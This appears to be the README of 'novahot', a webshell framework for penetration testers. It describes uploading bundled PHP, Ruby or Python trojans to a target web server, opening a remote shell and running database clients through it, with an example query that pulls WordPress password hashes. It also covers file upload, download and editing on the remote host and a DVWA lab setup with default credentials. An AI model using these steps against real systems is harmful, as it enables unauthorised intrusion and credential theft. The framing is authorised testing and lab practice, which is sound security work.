[![Build Status](https://travis-ci.org/chrisallenlane/novahot.svg)](https://travis-ci.org/chrisallenlane/novahot)
[![npm](https://img.shields.io/npm/v/novahot.svg)]()
[![npm](https://img.shields.io/npm/dt/novahot.svg)]()


novahot
=======
`novahot` is a webshell framework for penetration testers. It implements a
JSON-based API that can communicate with trojans written in any language. By
default, it ships with trojans written in PHP, ruby, and python.

Beyond executing system commands, `novahot` is able to emulate interactive
terminals, including `mysql`, `sqlite3`, and `psql`. It additionally implements
"virtual commands" that make it possible to upload, download, edit, and view
remote files locallly using your preferred applications.


Installation
------------
Install the executable directly from npm:

```sh
[sudo] npm install -g novahot
```

Then seed a config file:

```sh
novahot config > ~/.novahotrc
```


Usage
-----
1. View the available trojans with `novahot trojan list`.

2. Select a trojan in a language that is appropriate for your target, then copy
   its source to a new file. (Ex: `novahot trojan view basic.php > ~/my-trojan.php`)

3. Change the control password in the newly-created trojan.

4. Upload the trojan to a web-accessible location on the target.

5. Configure target information in the `targets` property in `~/.novahotrc`.

6. Run `novahot shell <target>` to open a shell.


Shell Modes
-----------
Internally, `novahot` uses "modes" and "adapters" to emulate various
interactive clients, currently including the `mysql`, `psql` (postgres), and
`sqlite3` clients.

To change `novahot`'s mode, issue the appropriate "dot command":

```sh
.mysql { "username" : "mysql-user", "password" : "the-password", "database" : "the-database" }
```

(Connection parameters may be specified as JSON while changing modes, or
alternatively saved as target configuration data in `~/.novahotrc`.)

For example, the `mysql` mode makes it possible to directly run queries like
the following:

```sql
mysql> SELECT ID, user_login, user_email, user_pass FROM wp_users;
```

There additionally exists a `payload` mode that can be used to `POST` arbitrary
data to the trojan. [See the wiki for more information][payload-mode].


Virtual Commands
----------------
`novahot` implements four "virtual commands" that utilize payloads built in
to the trojans to extend the functionality of the shell:

### download ###
```sh
download <remote-filename> [<local-filename>]
```

Downloads `<remote-filename>` to `--download-dir`, and optionally renames it to
`<local-filename>` if specified.

### upload ###
```sh
upload <local-filename> [<remote-filename>]
```

Uploads `<local-filename>` to the shell's `cwd`, and optionally renames
`<local-filename>` to `<remote-filename>` if specified.

### view ###
```sh
view <remote-filename> [<local-filename>]
```

Downloads `<remote-filename>` to `--download-dir`, and optionally renames it to
`<local-filename>` After downloading, the file will be opened by the "viewer"
application specified in the [configs][configuration].

### edit ###
```sh
edit <remote-filename>
```

Downloads `<remote-filename>` to a temporary file, and then opens that file for
editing using the "editor" specified in the [configs][configuration].
Afterward, if changes to the file are saved locally, the file will be
re-uploaded to the server automatically.


Provisioning a Test Environment
-------------------------------
This repository contains a laboratory environment built on [Vagrant][],
[Docker][], and the [Damn Vulnerable Web Application][dvwa] ("DVWA").  Steps
for provisioning the environment vary depending on the capabilities of your
physical host.

### Using docker-compose ###
If you have `docker` and `docker-compose` installed on your physical host, you
may simply do the following:

1. Clone and `cd` to this repository
2. Run: `docker-compose up`

After the docker container starts, the DVWA will be accessible at
http://localhost:80.

### Using vagrant ###
If `docker` is not installed on your physical host, you may use
Vagrant/Virtualbox to access a docker-capable virtual-machine:

1. Clone and `cd` to this repository
2. Provision a virtual machine: `vagrant up`
3. SSH into the virtual machine: `vagrant ssh`
4. Start the docker container: `sudo su; cd /vagrant; docker-compose up`

The DVWA will be accessible at http://localhost:8000.

### Configuring novahot against the laboratory environment ###
Specify the following connection strings in your `~/.novahotrc` file to connect
the `novahot` client to the PHP trojan embedded in the DVWA container:

```javascript
{

  "targets": {
    "dvwa" : {
      "uri"      : "http://localhost:8000/novahot.php",
      "password" : "the-password",

      "mysql" : {
        "username": "root",
        "password": "vulnerables",
        "database": "dvwa"
      }
    }
  }

}
```

You may then establish a webshell via:

```sh
novahot shell dvwa
```

Additional Information
----------------------
Additional information can be found in the [wiki][]:

- [Configuration][configuration]
- [The Client/Trojan API][api]
- [sqlite3 "dot command" conflicts][sqlite-dotcommands]

[Docker]:             https://www.docker.com/
[Vagrant]:            https://www.vagrantup.com/
[api]:                https://github.com/chrisallenlane/novahot/wiki/The-Client-Trojan-API
[configuration]:      https://github.com/chrisallenlane/novahot/wiki/Configuring
[dvwa]:               http://www.dvwa.co.uk/
[payload-mode]:       https://github.com/chrisallenlane/novahot/wiki/The-Client-Trojan-API#payload-mode
[sqlite-dotcommands]: https://github.com/chrisallenlane/novahot/wiki/SQLite3-Mode-%22dot-command%22-Conflicts
[wiki]:               https://github.com/chrisallenlane/novahot/wiki
